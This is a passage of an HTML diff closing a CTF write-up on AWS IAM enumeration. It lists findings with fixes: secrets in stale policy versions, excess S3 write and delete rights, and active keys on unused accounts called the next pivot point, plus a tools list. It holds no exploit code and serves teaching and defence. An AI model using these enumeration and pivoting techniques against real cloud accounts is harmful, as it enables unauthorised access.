+    <h3>4. Stale Policy Versions</h3>
+    <p>AWS retains old policy versions unless explicitly deleted (up to 5 versions per policy). Both v1 and v2 of <code>minimal-access-policy</code> contained sensitive data. Most security tools only inspect the <em>default</em> version.</p>
+    <div class="warning-box">
+      <p><strong>Fix:</strong> Regularly delete old policy versions. Implement a policy lifecycle management process. When auditing, always enumerate ALL versions with <code>iam:ListPolicyVersions</code>.</p>
+    </div>
+
+    <h3>5. Overly Broad S3 Permissions</h3>
+    <p>The policy granted <code>s3:PutObject</code> and <code>s3:DeleteObject</code> in addition to read access — far more than necessary for a read-only scenario. This violates the principle of least privilege.</p>
+    <div class="warning-box">
+      <p><strong>Fix:</strong> Apply least-privilege principles. Grant only the specific permissions required for each use case. Regularly review and trim permissions using AWS IAM Access Advisor.</p>
+    </div>
+
+    <h3>6. Active Keys on Unused Accounts</h3>
+    <p>Users <code>pentest</code> and <code>snaptic-s3</code> had active access keys that appeared to be unused. In a real engagement these would be the next pivot point.</p>
+    <div class="warning-box">
+      <p><strong>Fix:</strong> Implement a key rotation policy. Disable or delete access keys unused for more than 90 days. Use <code>iam:GetAccessKeyLastUsed</code> in automated auditing scripts.</p>
+    </div>
+
+    <hr class="divider">
+
+    <!-- Tools Used -->
+    <h2 data-num="10">Tools Used</h2>
+    <div class="code-block">
+      <div class="code-header">
+        <div class="code-dots"><span></span><span></span><span></span></div>
+        <span class="code-lang">tools</span>
+      </div>
+      <pre><span class="var">boto3</span>          <span class="cm"># AWS SDK for Python — all API calls</span>
+<span class="var">Python 3</span>       <span class="cm"># Scripting and automation</span>
+<span class="var">AWS STS</span>        <span class="cm"># Identity verification</span>
+<span class="var">AWS IAM API</span>    <span class="cm"># Policy and user enumeration</span>
+<span class="var">AWS S3 API</span>     <span class="cm"># Bucket and object enumeration</span></pre>
+    </div>
+
+  </article>
+</div>
+
+<footer>
+  <div class="container">
+    <div class="footer-content">
+      <div class="footer-text">RedFox CTF 2026 — AWS IAM Enumeration Writeup</div>
+      <div class="footer-badge">✓ SOLVED</div>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
